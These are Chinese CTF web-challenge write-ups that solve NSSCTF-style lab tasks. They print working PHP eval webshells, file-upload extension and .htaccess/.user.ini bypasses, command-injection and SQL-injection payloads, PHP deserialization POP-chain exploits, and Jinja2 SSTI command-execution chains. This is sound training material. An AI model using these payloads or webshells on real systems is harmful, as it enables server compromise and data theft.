## `[SWPUCTF 2021 新生赛]Do_you_know_http]`
根据提示将用hackbar将user-agent改为WLLM,又提示用本地访问，将x-forwarded-for改为127.0.0.1  ,记得访问的是a.php,不是hello.php了，a.php是抓包放行后看到的
## `[SWPUCTF 2021 新生赛]easy_md5`
```php
if ($name != $password && md5($name) == md5($password)){  
        echo $flag;
```
可以用数组绕过，get`?name[]=1` post`password[]=2`MD5函数无法解析数组，会返回null,`null==null`
## `[第五空间 2021]WebFTP`
题目提示是git泄露，可以用githack工具扫描一下，看一下都有哪些文件可能包含flag,扫描出一个`readm.txt`的文件，访问一下(注意访问的时候把网址上自带的`?m=login&a=in`删掉)，发现文件中有用户和密码，直接登录，找到一个phpinfo的文件，访问他搜索flag,得到flag,或者直接用githack扫出来的文件就有phpinfo文件，可以直接访问

## babyrce
先发送cookie请求，用hackbar将cookie的vaule改为admin=1,发送得到一个文件`rasalghul.php`访问他，发送get请求`?url=ls${IFS}/`用`${IFS}`代替空格，看到一个`flllllaaaaaaggggggg`,再发送`?url=cat${IFS}/flllllaaaaaaggggggg`得到flag
## `[SWPUCTF 2021 新生赛]easyupload2.0`
可以考虑上传一个一句话木马文件`shell.php`，
```php
<?php
@eval($_POST['cmd']);
?>
```
发现php不行，但是有许多与php,等价的文件后缀，都试一下php3，php5，pht，phtml，phps，发现phtml可以上传，让后访问一下这个文件，它提示放在upload目录下了，访问`upload/shell.phtml`发现一片空白，说明他被当作代码执行了，再用蚁剑连接这个访问文件的这个网址,即`容器url/upload/shell.phtml`,连接成功，发现一个flag.php的文件，打开就是flag
## `[LitCTF 2023]PHP是世界上最好的语言！！`
页面有一堆不明意义的功能，但因该考察的还是php,所以在右边框输入php代码查文件
```php
<?php
system('ls /');
?>
```
发现flag文件，再
```php
<?php
system('cat /flag');
?>
```
## jicao
```php
<?php  
highlight_file('index.php');  
include("flag.php");  
$id=$_POST['id'];  
$json=json_decode($_GET['json'],true);  
if ($id=="wllmNB"&&$json['x']=="wllm")  
{echo $flag;}  
?>
```
传入post`id=wllmNB`   json_decode会将json格式解码，这道题`?json={"x":"wllm"}`
## easyupload1.0
可以上传一个一句话木马文件，shell.jpg ,上传抓包，将后缀改为php,绕过检测，上传成功，再用蚁剑连接，找到一个flag.php,的文件，但flag是假的，要在lib文件右键打开控制台，输入`printenv`输出环境变量，其中就有真正的flag,发现源码没过滤后缀，只过滤了Content-Type，只能是jpg,gif,png
## easyupload2.0
上传一句话木马，shell.jpg,上传抓包，将后缀改为php,发现php不行，就想到用phtml,成功了，用蚁剑连接，找到flag,这个flag是真的，当然用在lib文件右键打开控制台，输入`printenv`输出环境变量的方法也可以，找到源代码，发现只过滤了php,hta,ini
## easyupload3.0
用以上方法都不行，可以试一下文件后缀爆破
php
php2
php3
php4
php5
php6
php7
phps
pht
phtm
phtml
pgif
php#.png
shtml
htaccess
user.ini
phar
inc
hphp
ctp
module
php%20
php%0a
php%00
php%0d%0a
php/
php.
file.png.php
png.pHp5
php%00.png
php\x00.png
php%0a.png
php%0d%0a.png
phpJunk123png
png.jpg.php
php%00.png%00.jpg
看一下哪些后缀可以上传成功，发现.htaccess可以成功，就想到可以先上传一个内容为
```
<FilesMatch "shell3.jpg">
    SetHandler application/x-httpd-php
</FilesMatch>
```
的文件，再上传shell3.jpg ，这样shell3.jpg就会解析为php文件，再连接蚁剑就找到flag了
## PseudoProtocols
提示有一个叫hint.php的文件，但是无法直接访问，可以用伪协议读取出来，`php://filter/read=convert.base64-encode/resource=hint.php`,base64解码后得到一个文件`test2222222222222.php`直接访问，因为`if(isset($a)&&(file_get_contents($a,'r')) === 'I want flag')`可以用data协议将内容伪装成文件，`?a=data://text/plain,I want flag`得到flag
## ez_ez_php
提示文件名flag.php  `substr($_GET["file"], 0, 3) === "php"`要求文件开头三个字符为php,首先想到php伪协议，试一下`?file=php://filter/read=convert.base64-encode/resource=flag.php`解码后得到提示说文件在flag文件里，改一下`?file=php://filter/read=convert.base64-encode/resource=flag`解码得到flag
## babyRCE
因为ls没被过滤，可以查一下文件有flag.php,因为有许多和cat类似的函数和空格符号都被过滤了，但grep，`$`,`{`,`\`(转义字符)没有，可以用`grep${IFS}a${IFS}f\lag.php`意为从flag.php文件里搜索包含a的行，得到flag
## 导弹迷踪
这个没办法抓包，控制台禁止了，可以试一下通关（不是很难），也可以找一个game.js的文件其中有`FINISH: {
title: function () {return 'LEVEL COMPLETED';},
text:  function () {if (mLevel === 6) {return 'GOT F|L|A|G {y0u_w1n_th1s_!!!}';} else {return 'CLICK TO CONTINUE';}}可以看到flag泄露啦，故意用|隔开防止直接搜索
## finalrce
这题难点在`exec`是命令执行函数但执行结果不回显，可以用一些其他方法，如`ls > 1.txt`可以将当前目录下的文件名放到1.txt里，但ls和>都被禁了，ls可以用转义符`l\s`，>可以用tee代替,  
tee命令:linux中用于读取标准输入的数据，并将其内容输出成文件，与>作用差不多  
`|`管道符表示将上一个命令的输出传递给下一个命令作为输入  
所以可以用`?url=l\s / | tee 1.txt`根目录的内容都存到1.txt里了，访问文件，输出文件列表，flag可能在`flllllaaaaaaggggggg`里，再用刚才的方法,`?url=grep C /flllll?aaaaaggggggg | tee 1.txt` cat被禁了可以用grep,又因为`la`被禁了，通配符`*`被禁了,但可以用?匹配单个字符，然后访问1.txt，得到flag，因为flag形式为NSSCTF{}，所以搜索C,也可以用tac代替cat
## hardrce
禁止所有字母和大部分符号，可以用~取反(没禁)，可以不用字母，可以用脚本将`system` 和`ls /`分别转换url编码取反  
```python
def force_url_encode(s):  
    """强制对所有字符进行URL编码（%XX形式，大写十六进制）"""  
    return ''.join([f'%{format(ord(c), "02X")}' for c in s])  
  
  
def url_decode(encoded_str):  
    """将%XX格式的URL编码字符串解码为原始字符"""  
    decoded = []  
    i = 0  
    while i < len(encoded_str):  
        if encoded_str[i] == '%' and i + 2 < len(encoded_str):  
            hex_str = encoded_str[i + 1:i + 3]  
            decoded_char = chr(int(hex_str, 16))  
            decoded.append(decoded_char)  
            i += 3  
        else:  
            decoded.append(encoded_str[i])  
            i += 1  
    return ''.join(decoded)  
  
  
def bitwise_not(s):  
    """对字符串中每个字符执行按位取反（~）"""  
    return ''.join([chr(~ord(c) & 0xFF) for c in s])  
  
  
# 主程序：接收用户输入并处理  
if __name__ == "__main__":  
    # 获取用户输入  
    user_input = input("请输入需要处理的字符串：")  
  
    # 步骤1：强制URL编码  
    encoded = force_url_encode(user_input)  
    print(f"\n1. 强制URL编码结果：{encoded}")  
  
    # 步骤2：将编码结果解析为字符（用于取反）  
    decoded_encoded = url_decode(encoded)  
  
    # 步骤3：对解析后的字符执行按位取反  
    not_result = bitwise_not(decoded_encoded)  
    # 取反结果可能包含不可见字符，同时显示其URL编码便于查看  
    not_result_encoded = force_url_encode(not_result)  
    print(f"2. 按位取反（~）后的字符（URL编码形式）：{not_result_encoded}")  
  
    # 反向验证：对取反结果再取反，应回到原始字符串  
    reversed_not = bitwise_not(not_result)  
    print(f"3. 对取反结果再次取反，验证是否还原：{reversed_not}")
```
system编码为`%8C%86%8C%8B%9A%92`,`ls /`编码为`%93%8C%DF%D0` 所以payload是`?wllm=(~%8C%86%8C%8B%9A%92)(~%93%8C%DF%D0);`发现`flllllaaaaaaggggggg`,将`cat /flllllaaaaaaggggggg`编码为`%9C%9E%8B%DF%D0%99%93%93%93%93%93%9E%9E%9E%9E%9E%9E%98%98%98%98%98%98%98`,所以payload`?wllm=(~%8C%86%8C%8B%9A%92)(~%9C%9E%8B%DF%D0%99%93%93%93%93%93%9E%9E%9E%9E%9E%9E%98%98%98%98%98%98%98);`得到flag，括号可以分割指令
## babyphp
第一步绕过`isset($_POST['a'])&&!preg_match('/[0-9]/',$_POST['a'])&&intval($_POST['a'])`，要a不能有数字，但必须是整数，可以用数组绕过，`$_POST['b1']!=$_POST['b2']&&md5($_POST['b1'])===md5($_POST['b2'])`经典的数组绕过，`$_POST['c1']!=$_POST['c2']&&is_string($_POST['c1'])&&is_string($_POST['c2'])&&md5($_POST['c1'])==md5($_POST['c2'])`限定必须是字符串，不能用数组绕过了，但可以用特殊值（0e开头的科学计数法结果都为零），  特例
```
*MD5*
QNKCDZO
0e830400451993494058024219903391
s878926199a
0e545993274517709034328855841020
s155964671a
0e342768416822451524974117254469
s214587387a
0e848240448830537924465865611904
s878926199a
0e545993274517709034328855841020
*sha1*
10932435112(如果sha1要用纯数字)
0e07766915004133176347055865026311692244
```
最终payload`a[]=1&b1[]=2&b2[]=3&c1=s878926199a&c2=s155964671a`
## 奇妙的MD5
ctf中有两个字符串比较神奇  
- **0e215962017**  md5加密后0e291242476940776845150308577824，这个是因为php弱比较不会比较类型，两个字符串都看成科学计数法，所以加密前后都相等，都是0
- **ffifdyop**  md5加密后276f722736c95d99e921722cf9ed621c，转成十六进制字符串为`'or'6É]é!r,ùíb`，正好是一个万能密码
随便输入抓一下包，repeater放行后响应包里有一句`hint: select * from 'admin' where password=md5($pass,true)`这是一句sql语句，`md5($pass, true)` 是对变量 `$pass` 进行 MD5 哈希运算，`true` 作为第二个参数，表示返回二进制形式的哈希结果（而非默认的 32 位十六进制字符串）。
- 整个条件的意思是：只返回 `password` 字段的值与 `$pass` 的二进制 MD5 哈希值相等的记录。
- 可以在输入界面输入`ffifdyop`,进入一个新界面，网页源代码的注释里有一段php代码  
```php
|$x= $GET['x'];|
|$y = $_GET['y'];|
|if($x != $y && md5($x) == md5($y)){|
|;
```
可以用数组绕过，或者可以用上一题的特例，又进入一个新界面，因为跳转到一个新界面，所以hackbar要从新load一下在提交post
```php
<?php  
error_reporting(0);  
include "flag.php";  
  
highlight_file(__FILE__);  
if($_POST['wqh']!==$_POST['dsy']&&md5($_POST['wqh'])===md5($_POST['dsy'])){  
    echo $FLAG;  
}
```
可以用数组绕过,不可以用上一题的特例，因为是强类型比较
## 高亮主题(划掉)背景查看器
如果修改的theme的话，就会自动发送一个请求，post`theme=theme1.php`但是传url参数没有任何反应，可以试一下post`theme=flag`就会报错`**Warning**: include(): Failed opening 'themes/flag' for inclusion (include_path='.:/usr/local/lib/php') in **/var/www/html/index.php** on line **11**`可以猜到是路径穿越，一层一层试，最后四层就好了，flag不行的话也可以试试flag.php,payload`theme=../../../../flag`或者可以用另一种方法，日志包含漏洞，因为访问`../../../../../var/log/nginx/access.log`看到日志里回显的是user-agent内容，可以抓包在user-agent后加入代码，如在后面加入`<?php system('ls /');?>`再访问一下日志，可以看到后面有一个flag文件，再cat一下就得到flag.,在日志里，或者可以传入一句话木马，连接蚁剑
## 怎么多了个没用的php文件
又是文件上传，用文件后缀爆破一下，发现.htaccess和user.ini但是根据访问notion.php后的报错可以看到使用nginx服务器，而.htaccess只能用于apache服务器，所以可以试一下.user.ini文件内容是`auto_prepend_file = shell3.jpg`先上传这个文件，再上传shell.jpg这样就可以解析为php文件，上传成功后可以点击一下下载，可以再网址栏看到文件是被包含到uploads文件夹下了，可以在这个文件夹下访问notion.php,再用蚁剑连接得到flag
## sql
空格被过滤用`/**/`代替，#用%23代替，=用like代替
这样就可以注入了  
payload`?wllm=-1'union/**/select/**/1,database(),3%23`  ```
`wllm=-1'union/**/select/**/1,group_concat(table_name),3/**/from/**/information_schema.tables/**/where/**/table_schema/**/like/**/'test_db'%23`  ```
`?wllm=-1'union/**/select/**/1,2,group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_schema/**/like/**/'test_db'%23`
`?wllm=-1'union/**/select/**/1,2,mid(group_concat(flag),20)/**/from/**/test_db.LTLT_flag%23`
可以用这种方式逐条显示，最后把flag拼完整
## UploadBaby
看一下前端代码，可以知道他只检测`concent-type`为`image/jpeg`抓包改一下，再用蚁剑连接
## RCE-PLUS
与finalrce十分相似，但是这个更简单，因为>没被禁，flag用\转义符绕过就行
## 1z_unserialize
题目  
```php
class lyh{  
    public $url = 'NSSCTF.com';  
    public $lt;  
    public $lly;  
       
     function  __destruct()  
     {        $a = $this->lt;        
			    $a($this->lly);  
     }  
      
      
}  
unserialize($_POST['nss']);  
highlight_file(__FILE__);  ?>
```
用以下代码在本地运行
```php
<?php
class lyh{
    public $url = 'NSSCTF.com';
    public $lt="system";
    public $lly="cat /flag";
}
$a=new lyh();
echo serialize($a);
?>
```
得到payload`O:3:"lyh":3:{s:3:"url";s:10:"NSSCTF.com";s:2:"lt";s:6:"system";s:3:"lly";s:9:"cat /flag";}`
## ez_unserialize
题目，扫一下目录，有一个robots.txt访问进入一个代码页面
```php
<?php  
error_reporting(0);  
show_source("cl45s.php");  
class wllm{  
    public $admin;  
    public $passwd;  
  
    public function __construct(){        
    $this->admin ="user";        
    $this->passwd = "123456";  
    }  
        public function __destruct(){  
        if($this->admin === "admin" && $this->passwd === "ctf"){  
            include("flag.php");  
            echo $flag;  
        }else{  
            echo $this->admin;  
            echo $this->passwd;  
            echo "Just a bit more!";  
        }  
    }  
}  
  
$p = $_GET['p'];  
unserialize($p);  
  
?>
```
要获取 flag，需满足析构方法的条件：`$admin === "admin"`且`$passwd === "ctf"`。
由于反序列化会重建对象并覆盖原有属性（构造方法在反序列化时**不会自动调用**），因此可以直接构造一个`wllm`类的序列化字符串，手动设置`$admin`和`$passwd`为目标值。
所以可以用以下代码在本地运行
```php
<?php
class wllm{
    public $admin = 'admin';
    public $passwd="ctf";
}
$a=new wllm();
echo serialize($a);
?>
```
得到字符串`O:4:"wllm":2:{s:5:"admin";s:5:"admin";s:6:"passwd";s:3:"ctf";}`用get发送得到flag
## ez_ez_unserialize
```php
<?php
class X
{
    public $x = __FILE__;//定义了`X`类，包含公共属性`$x`（初始值为当前文件路径`__FILE__`）。
    function __construct($x)//构造方法`__construct($x)`：接收参数并赋值给`$x`（实例化对象时调用）。
    {
        $this->x = $x;
    }
    function __wakeup()//魔术方法`__wakeup()`：反序列化时自动调用，核心逻辑是：如果`$x`不等于当前文件路径`__FILE__`，则强制将`$x`重置为`__FILE__`（试图阻止修改`$x`）。
    {
        if ($this->x !== __FILE__) {
            $this->x = __FILE__;
        }
    }
    function __destruct()//魔术方法`__destruct()`：对象销毁时自动调用，通过`highlight_file($this->x)`读取并显示`$x`对应的文件内容（提示 flag 在`fllllllag.php`中）。
    {
        highlight_file($this->x);
        //flag is in fllllllag.php
    }
}
if (isset($_REQUEST['x'])) {
    @unserialize($_REQUEST['x']);//反序列化入口：通过`$_REQUEST['x']`接收用户输入，直接传入`unserialize()`解析。
} else {
    highlight_file(__FILE__);
}

```
关键是**绕过`__wakeup()`的执行**。
PHP 反序列化中存在一个特性：当序列化字符串中表示对象属性数量的值**大于实际属性数量**时，`__wakeup()`方法会被跳过（不执行）。这是突破的关键。构造代码
```php
<?php
class X{
    public $x;
}
$a=new X();
$a->x='fllllllag.php';
echo serialize($a);
?>
```
得到序列化字符串`O:1:"X":1:{s:1:"x";s:13:"fllllllag.php";}`  
PHP 序列化对象的基本格式为：`O:<类名长度>:"<类名>":<属性数量>:{<属性键值对列表>}`  
将属性数量从`1`改为`2`（大于实际数量 1），得到恶意序列化字符串：`O:1:"X":2:{s:1:"x";s:13:"fllllllag.php";}`  
将恶意序列化字符串通过`REQUEST`参数`x`传入（GET/POST 均可）
## include
先随便传一个file参数，得到源码，flag再flag.php里，可以用php://filter伪协议`?file=php://filter/read=convert.base64-encode/resource=flag.php`再base64解码，得到flag
## funny_php
源码
```php
<?php  
    session_start();    highlight_file(__FILE__);  
    if(isset($_GET['num'])){  
        if(strlen($_GET['num'])<=3&&$_GET['num']>999999999){  
            echo ":D";            $_SESSION['L1'] = 1;  
        }else{  
            echo ":C";  
        }  
    }  
    if(isset($_GET['str'])){        $str = preg_replace('/NSSCTF/',"",$_GET['str']);  
        if($str === "NSSCTF"){  
            echo "wow";            $_SESSION['L2'] = 1;  
        }else{  
            echo $str;  
        }  
    }  
    if(isset($_POST['md5_1'])&&isset($_POST['md5_2'])){  
        if($_POST['md5_1']!==$_POST['md5_2']&&md5($_POST['md5_1'])==md5($_POST['md5_2'])){  
            echo "Nice!";  
            if(isset($_POST['md5_1'])&&isset($_POST['md5_2'])){  
                if(is_string($_POST['md5_1'])&&is_string($_POST['md5_2'])){  
                    echo "yoxi!";                    $_SESSION['L3'] = 1;  
                }else{  
                    echo "X(";  
                }  
            }  
        }else{  
            echo "G";  
            echo $_POST['md5_1']."\n".$_POST['md5_2'];  
        }  
    }  
    if(isset($_SESSION['L1'])&&isset($_SESSION['L2'])&&isset($_SESSION['L3'])){  
        include('flag.php');  
        echo $flag;  
    }    ?>
```
要进行多层绕过，第一层用科学计数法绕过，第二层用双写绕过，第三层的第一步可以用数组绕过，可后面又需要是字符串，但他是弱比较，所以可以用一些MD5后以0e开头的字符串绕过，得到flag,最终payload为`?num=9e9&str=NSNSSCTFSCTF`  `md5_1=s878926199a&md5_2=s155964671a`
## ZJCTF，不过如此
`?text=data://text/plain,I have a dream&file=php://filter/read=convert.base64-encode/resource=next.php`首先用data协议把那句话伪装成文件，再用php://filter协议输出提示的next.php的文件内容，解码后是  
```php
<?php
$id = $_GET['id'];
$_SESSION['id'] = $id;
function complex($re, $str) {
    return preg_replace(
        '/(' . $re . ')/ei',
        'strtolower("\\1")',
        $str
    );
}
foreach($_GET as $re => $str) {
    echo complex($re, $str). "\n";
}
function getFlag(){
	@eval($_GET['cmd']);
}
```
其中`preg_replace('/(' . $re . ')/ei', 'strtolower("\\1")', $str)`  
- 第一个参数 `/(' . $re . ')/ei`：正则表达式模式，其中：
- `(` 和 `)`：捕获分组，将匹配到的内容存入 `\1`（反向引用）。
- `e`：**评估（evaluate）修饰符**，将替换字符串当作 PHP 代码执行（已废弃，度危险）。
- `i`：不区分大小写匹配。
- 第二个参数 `'strtolower("\\1")'`：替换字符串，`\\1` 会被替换为正则匹配到的内容（即第一个捕获分组的结果）。
- 第三个参数 `$str`：待处理的原始字符串。
- `/e` 修饰符的作用是：在替换时，将第二个参数（替换字符串）当作 PHP 代码执行，并将执行结果作为最终的替换值。
- foreach(_GET as $re => str)意思是get传参,str)意思是get传参,re=str,
1. 正则 `/(...)/` 匹配 `$str` 中的内容，假设匹配到 `X`，则 `\1` 代表 `X`。
2. 替换字符串会被解析为 `strtolower("X")`（`\\1` 被替换为 `X`）。
3. 由于 `/e` 修饰符，`strtolower("X")` 会被当作 PHP 代码执行。
4. 若 `X` 中包含恶意代码（如函数调用、变量解析等），则会被执行。
最后payloads为`http://node4.anna.nssctf.cn:28151/next.php?\S*=${getFlag()}&cmd=system('env');`next.php虽然无权访问，但可以在其目录下执行命令，`\S*` 和 `.*` 都表示匹配任意字符序列，但这里只可以用`\S*`,在 PHP 中，用`{}`包裹代码（如`${getFlag()}`）是利用了**双引号字符串中的变量解析特性**，其核心作用是**强制 PHP 执行`{}`内的表达式或函数调用**，并将结果嵌入字符串中。用`${getFlag()}`调用上面定义的函数，`\S*`匹配任意字符，匹配到后面的${getFlag()}，再执行cmd=命令;可以用`system('ls /');`和`system('find / -name *flag*')`;试一下，但都找不到flag,这时想到可能藏在环境变量里，就用`system('env');`或`phpinfo();`输出环境变量，找到flag
## 巴巴托斯！
将user-agent改为`FSCTF Browser`,试了一下改x-forward-for 和 x-real-ip都不行，再将referer改为`127.0.0.1`然后就没提示了，因为最开始的网址为`http://node4.anna.nssctf.cn:28578/index.php?file=show_image.php`所以可以试一下文件包含`index.php?file=/etc/passwd/`发现可以输出内容，用的nginx服务器，这时可以直接用php伪协议输出flag,`?file=php://filter/read=convert.base64-encode/resource=flag.php`(文件名是猜的)，或者文件包含，用`?file=<?php system('ls /');?>`网页显示报错，可是回显在日志里，访问一下日志，看到根目录里没有flag,可以列一下bin目录，看有哪些命令可以执行，反正find是不行了，可以直接用cat `?file=<?php system('cat fla*');?>`再访问日志`?file=/var/log/nginx/access.log`,滑到日志最下面，得到flag,命令之所以可以执行，是因为没有过滤，存在文件包含漏洞
## `[SWPU 2024 新生引导]ez_upload`
先尝试提交php一句话木马，抓包，直接上传肯定不成功，可以尝试一下改Content-Type为`image/jpeg`伪装成jpg文件，结果上传成功了，提示上传到`uploads/shell3.php`访问它，看到我的代码被执行了，就可以连接蚁剑了，得到flag,顺带找一下源码，看到，` $allowed_content_types = array("image/jpeg", "image/png", "image/gif");`只检测了Content-Type为这几个
## `[GHCTF 2025]UPUPUP`

先上传php木马抓包，php等后缀都不行，但可以上传.htaccess,但必须在文件内容前加上GIF89a来伪装成文件,.htaccess文件内容为
```
GIF89a
<FilesMatch "shell3.jpg">
    SetHandler application/x-httpd-php
</FilesMatch>
```
在上传一个名为`shell3.jpg`的图片马，内容为
```php
GIF89a
<?php
@eval($_POST['cmd']);
phpinfo();
?>
```
最后用蚁剑连接`http://node1.anna.nssctf.cn:28485/images/shell3.jpg`得到flag
## 看看ip


## `[SWPUCTF 2021 新生赛]pop`
题目、
```php
<?php  
  
error_reporting(0);  
show_source("index.php");  
  
class w44m{  
  
    private $admin = 'aaa';  
    protected $passwd = '123456';  
  
    public function Getflag(){  
        if($this->admin === 'w44m' && $this->passwd ==='08067'){  
            include('flag.php');  
            echo $flag;  
        }else{  
            echo $this->admin;  
            echo $this->passwd;  
            echo 'nono';  
        }  
    }  
}  
  
class w22m{  
    public $w00m;  
    public function __destruct(){  
        echo $this->w00m;  
    }  
}  
  
class w33m{  
    public $w00m;  
    public $w22m;  
    public function __toString(){        $this->w00m->{$this->w22m}();  
        return 0;  
    }  
}  
  
$w00m = $_GET['w00m'];  
unserialize($w00m);  
  
?>
```

-  1.查找入口
```
# 传参$w00m,直接反序列化，入口就在__destruct，或者_wakeup，这里的w22m符合条件
class w22m{
    public $w00m;
    public function __destruct(){
        echo $this->w00m;
    }
}
```
- 2.找链子
```
# echo一个对象，调用__toString方法，然后调用内部w00m的方法，由此可得链子如下
# w22m.__destruct().w00m->w33m.__toString().w00m->w44m.Getflag()
```
exp
```php
<?php
class w44m{
    private $admin = 'w44m';
    protected $passwd = '08067';
}
class w22m{
    public $w00m;
} 
class w33m{
    public $w00m;
    public $w22m;
}
# w22m.__destruct().w00m->w33m.__toString().w00m->w44m.Getflag()
$a = new w22m();
$b = new w33m();
$c = new w44m();
# 入口
$a->w00m=$b;
# 链子
$b->w00m=$c;
$b->w22m='Getflag';
echo urlencode(serialize($a));
?>
```
传参后得到flag
## ez_SSTI
文章https://www.cnblogs.com/hetianlab/p/17273687.html
用一下焚靖秒杀

## 锦家有什么
根据提示可知这是一个jinjia2模板，查看源码可知有一段注释提示了`/try_a_try`,访问看到参数要我们自己猜，猜参数是name(最常见)，发送`?name={{7*7}}`回显49，可知是jinjia2,用焚靖，得到flag,也可以不用工具用常规方法，先传参`?name={{7*7}}`回显49，说明有jinja2模板漏洞,
1. `{{''.__class__}}`查看当前类str
2. `{{''.__class__.__base__}}`回显object,object是最终的父类，说明到头了
3. `{{''.__class__.__base__.__subclasses__()}}`列出来所有子类，将他复制到vscode,将`,`替换为`\n`,这样一行一个类，方便查数，在这些中找到可以执行操作系统指令的模块，最常用的是，`os._wrap_close`,在表里查询，找到第155行是`os._wrap_close`
4. `{{''.__class__.__base__.__subclasses__()[154]}}`回显那个类，因为列表是从零开始数的，所以用154
5. `{{''.__class__.__base__.__subclasses__()[154].__init__}}`没有wrapper字样，说明重载了
6. `{{''.__class__.__base__.__subclasses__()[154].__init__.__globals}}`列出了所有可以用的方法函数，搜索一下，有popen(回显),system(无回显),eval等
7. `{{''.__class__.__base__.__subclasses__()[154].__init__.__globals['__builtins__']['eval']("__import__('os').popen('cat /flag').read()")}}`执行命令，得到flag
8. 或者最后一步可以更简单`{{''.__class__.__base__.__subclasses__()[154].__init__.__globals__['popen']('cat /flag').read()}}`直接得到flag
## ez_include
```php
<?php  
stream_wrapper_unregister('php'); //禁用了php://filter和php://input协议 
  
if(!isset($_GET['no_hl'])) highlight_file(__FILE__);  
  
$mkdir = function($dir) {    system('mkdir -- '.escapeshellarg($dir));  //`escapeshellarg($dir)` 会对目录名进行 shell 转义，防止命令注入
};  
$randFolder = bin2hex(random_bytes(16)); //生成一个随机的 16 字节二进制串 `random_bytes(16)`，再用 `bin2hex` 转成 32 个十六进制字符的字符串。 
$mkdir('users/'.$randFolder); //调用刚才定义的匿名函数 `$mkdir`，创建目录 `users/<randFolder>`。
chdir('users/'.$randFolder);//切换 PHP 的当前工作目录到刚创建的临时目录 `users/<randFolder>`。
  
$userFolder = (isset($_SERVER['HTTP_X_FORWARDED_FOR']) ? $_SERVER['HTTP_X_FORWARDED_FOR'] : $_SERVER['REMOTE_ADDR']);  //- 优先使用 `HTTP_X_FORWARDED_FOR`（来自代理或负载均衡转发的头）。- 如果没有该头，则使用 `REMOTE_ADDR`（直接的客户端 IP）。
$userFolder = basename(str_replace(['.','-'],['',''],$userFolder));  
  //移除 `.` 和 `-` 字符（将点和短横删除），这是为了避免路径穿越或非法字符。`basename(...)`：取最终路径的最后一段，进一步避免路径中包含斜杠造成目录跳出
$mkdir($userFolder);  //在当前工作目录（`users/<randFolder>`）下创建以 `$userFolder` 命名的目录（即 `users/<randFolder>/<userFolder>`）。
chdir($userFolder); //切换当前工作目录到 `users/<randFolder>/<userFolder>`。 
file_put_contents('profile',print_r($_SERVER,true));//将 `print_r($_SERVER, true)` 的字符串化输出写入当前目录下名为 `profile` 的文件。 
chdir('..'); //进入上一级目录，也就是回到 `users/<randFolder>` 
$_GET['page']=str_replace('.','',$_GET['page']);//将用户传入的 `page` 参数中的所有 `.`（点）去掉，目的是防止使用 `../` 或文件扩展名等以点为基础的跳转或包含
if(!stripos(file_get_contents($_GET['page']),'<?') && !stripos(file_get_contents($_GET['page']),'php')) {  
    include($_GET['page']);  //`stripos( <content>, '<?')`：在文件内容中查找 `'<?'` 子串（PHP 开始标签），`stripos` 是大小写不敏感的查找，返回 **位置（0-based）** 或 `false`。
}  
  
chdir(__DIR__); //把当前工作目录切回脚本所在的目录（`__DIR__` 为当前脚本文件的目录） 
system('rm -rf users/'.$randFolder);//调用系统命令删除刚创建的临时目录：`rm -rf users/<randFolder>`，连同其子目录和文件一起删除（清理）。
  
?>
```
由于 `!stripos` 的错误用法，若 `'<?'` 出现在文件开头（返回 0），`!stripos(...)` 为 `true`，这会让包含条件误通过，从而反而允许包含含 `<?` 的文件 —— 这是关键绕过点。

## `[UUCTF 2022 新生赛]ez_upload`
Apache对文件名后缀的识别是从后往前进行的，当遇到不认识的后缀时，继续往前，直到识别。以第一个点为分割符，取第一个点之后作为文件后缀名。所以提交时改名为shell3.jpg.php上传成功，但服务器能解析为php文件，记得改contant-Tape和加GIF89a前缀，进行绕过
## `[SWPUCTF 2022 新生赛]ez_1zpop`
```php
<?php  
error_reporting(0);  
class dxg  
{  
   function fmm()  
   {  
      return "nonono";  
   }  
}  
  
class lt  
{  
   public $impo='hi';  
   public $md51='weclome';  
   public $md52='to NSS';  
   function __construct() //wakeup避免触发了，这个就跟着避免触发了，因为只有new 可以触发__construct 
   {      
   $this->impo = new dxg;  
   }  
   function __wakeup()  //这个要避免触发，
   {      
   $this->impo = new dxg;     
   return $this->impo->fmm();  
   }  
  
   function __toString()  
   {  
      if (isset($this->impo) && md5($this->md51) == md5($this->md52) && $this->md51 != $this->md52)  
         return $this->impo->fmm();//2.触发fmm(),但要先触发__tostring  
   }  
   function __destruct()  
   {  
      echo $this;  //3.触发__tostring,先触发__destruct()
   }  
}  
  
class fin  
{  
   public $a;  
   public $url = 'https://www.ctfer.vip';  
   public $title;  
   function fmm()  
   {      $b = $this->a;      $b($this->title); //1.最终要触发的，令$a="system",$title="ls /"执行命令 ，但要先触发fmm()
   }  
}  
  
if (isset($_GET['NSS'])) {   
$Data = unserialize($_GET['NSS']); //4.触发__destruct()
} else {   
highlight_file(__file__);  
}
```
得到payload`O:2:"lt":3:{s:4:"impo";O:3:"fin":3:{s:1:"a";s:6:"system";s:3:"url";s:21:"https://www.ctfer.vip";s:5:"title";s:9:"cat /flag";}s:4:"md51";s:7:"QNKCDZO";s:4:"md52";s:11:"s878926199a";}`其中需要将属性3改为4以绕过`__wakeup`,得到flag
## `[HZNUCTF 2023 preliminary]ppppop`
`www.zip`源码泄露
是tp6.0.12LTS框架，可以找通杀，尝试自己代码审计，打开源码文件夹，ctrl+shift+F全局搜索，`__destruct`找到
```php
public function __destruct()
    {
        if ($this->lazySave) {
            $this->save();
        }
    }
```
跟进`save()`
```php
   public function save(array $data = [], string $sequence = null): bool
    {
        // 数据对象赋值
        $this->setAttrs($data);
        if ($this->isEmpty() || false === $this->trigger('BeforeWrite')) {
            return false;
        }
        $result = $this->exists ? $this->updateData() : $this->insertData($sequence);
        if (false === $result) {
            return false;
        }
```
`$this->isEmpty()`或者`false===$this->trigger('BeforeWrite')`就会返回false，需要让`$this->isEmpty()`为false，`$this->trigger('BeforeWrite')`为true才能进入下一段执行，因为`||`会将上一段的输出作为下一段的输入，先看后面的trigger，位于`\vendor\topthink\think-orm\src\model\concern\ModelEvent.php`
```php
protected function trigger(string $event): bool
    {
        if (!$this->withEvent) {
            return true;
        }
        $call = 'on' . Str::studly($event);
        try {
            if (method_exists(static::class, $call)) {
                $result = call_user_func([static::class, $call], $this);
            } elseif (is_object(self::$event) && method_exists(self::$event, 'trigger')) {
                $result = self::$event->trigger('model.' . static::class . '.' . $event, $this);
                $result = empty($result) ? true : end($result);
            } else {
                $result = true;
            }
            return false === $result ? false : true;
        } catch (ModelEventException $e) {
            return false;
        }
    }
```
让`$this->withEvent`为false就可以返回true，再跟进`isEmpty()`
```php
 public function isEmpty(): bool
    {
        return empty($this->data);
    }
```
`empty()`中，参数是非空非零的值会返回false，这些变量也会被认为是空：
`"" int(0) float(0.0) "0" NULL FALSE array() //空数组 $var; //未初始化的变量`
